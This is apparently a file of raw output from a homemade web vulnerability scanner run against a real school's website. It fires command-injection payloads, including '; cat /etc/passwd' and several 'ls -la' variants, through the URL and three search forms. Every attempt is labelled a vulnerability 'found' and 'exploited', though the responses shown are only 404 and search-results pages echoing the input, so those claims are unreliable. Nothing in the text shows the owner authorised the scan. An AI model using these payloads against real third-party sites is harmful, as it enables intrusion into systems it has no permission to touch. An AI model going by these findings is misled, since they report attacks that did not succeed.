@@ -1,0 +1,144 @@
+Testing for XSS vulnerabilities:
+No XSS vulnerabilities found.
+Testing for SQL Injection vulnerabilities:
+No SQL Injection vulnerabilities found.
+Testing for Command Injection vulnerabilities:
+Command Injection vulnerability found in URL with payload: ; ls -la
+Exploited Command Injection result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Page not found &#8211; Shri Ram Public School</title>
+<met
+Command Injection vulnerability found in URL with payload: && ls -la
+Exploited Command Injection result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Page not found &#8211; Shri Ram Public School</title>
+<met
+Command Injection vulnerability found in URL with payload: | ls -la
+Exploited Command Injection result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Page not found &#8211; Shri Ram Public School</title>
+<met
+Command Injection vulnerability found in URL with payload: ; cat /etc/passwd
+Exploited Command Injection result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Page not found &#8211; Shri Ram Public School</title>
+<met
+Testing forms:
+
+Testing form 1: action=https://www.srpschool.com/, method=get
+Command Injection vulnerability found in form with payload: ; ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: && ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;&amp;&amp; ls -la&#8221; &#8211;
+Command Injection vulnerability found in form with payload: | ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;| ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: ; cat /etc/passwd
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; cat /etc/passwd&#8221; &#8211;
+
+Testing form 2: action=https://www.srpschool.com/, method=get
+Command Injection vulnerability found in form with payload: ; ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: && ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;&amp;&amp; ls -la&#8221; &#8211;
+Command Injection vulnerability found in form with payload: | ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;| ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: ; cat /etc/passwd
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; cat /etc/passwd&#8221; &#8211;
+
+Testing form 3: action=https://www.srpschool.com/, method=get
+Command Injection vulnerability found in form with payload: ; ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: && ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;&amp;&amp; ls -la&#8221; &#8211;
+Command Injection vulnerability found in form with payload: | ls -la
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;| ls -la&#8221; &#8211; Shri Ram
+Command Injection vulnerability found in form with payload: ; cat /etc/passwd
+Exploited Command Injection form result: <!DOCTYPE html>
+<html class="html" lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Search Results for &#8220;; cat /etc/passwd&#8221; &#8211;
